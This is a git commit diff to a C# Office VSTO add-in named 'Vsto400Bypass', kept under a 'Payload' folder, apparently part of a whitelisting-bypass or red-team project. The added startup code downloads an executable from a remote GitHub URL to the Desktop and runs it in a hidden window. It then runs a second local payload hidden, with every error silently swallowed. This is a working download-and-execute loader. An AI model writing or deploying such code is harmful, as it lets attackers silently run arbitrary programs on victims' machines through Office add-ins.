08ed410931afa2ede7dc2c531d3f641ebfecf944
unknown <A70002@itri.org.tw>
2020-07-16 11:02:21 +0800

    20200716

--- Payload/VstoAddin/Source/Vsto400BypassSource/Vsto400Bypass/ThisAddIn.cs
+++ Payload/VstoAddin/Source/Vsto400BypassSource/Vsto400Bypass/ThisAddIn.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Net;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -14,7 +15,54 @@ namespace Vsto400Bypass
     {
         private void ThisAddIn_Startup(object sender, System.EventArgs e)
         {
+            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/Vsto400Bypass/Vsto400BypassOnlinePayload.exe";
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string fileName = "\\Vsto400BypassOnlinePayloadDownloaded.exe", myStringWebResource = null;
+            string downloadPath = path + fileName;
+            // Create a new WebClient instance.
+            WebClient myWebClient = new WebClient();
+            try
+            {
+                string title = "Vsto400Bypass";
+                string message = "Download path:" + downloadPath;
+                //MessageBox.Show(message, title);
+                // Download the Web resource and save it into the current filesystem folder.
+                myWebClient.DownloadFile(remoteUri, downloadPath);
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+            }
+            catch
+            {
+            }
+            System.Diagnostics.Process processA = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
+            startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfoA.FileName = downloadPath;
+            processA.StartInfo = startInfoA;
+            try
+            {
+                processA.Start();
+            }
+            catch
+            {
+            }
+
+            string localPath = path + "\\Vsto400BypassOfflinePayload.exe";
+            System.Diagnostics.Process processB = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
+            startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfoB.FileName = localPath;
+            processB.StartInfo = startInfoB;
+            try
+            {
+                string title = "Vsto400Bypass";
+                string message = "Local path:" + localPath;
+                //MessageBox.Show(message, title);
+                processB.Start();
+            }
+            catch
+            {
+            }
+
             string filename = "/WLtester.txt";
             path += filename;
             using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew))
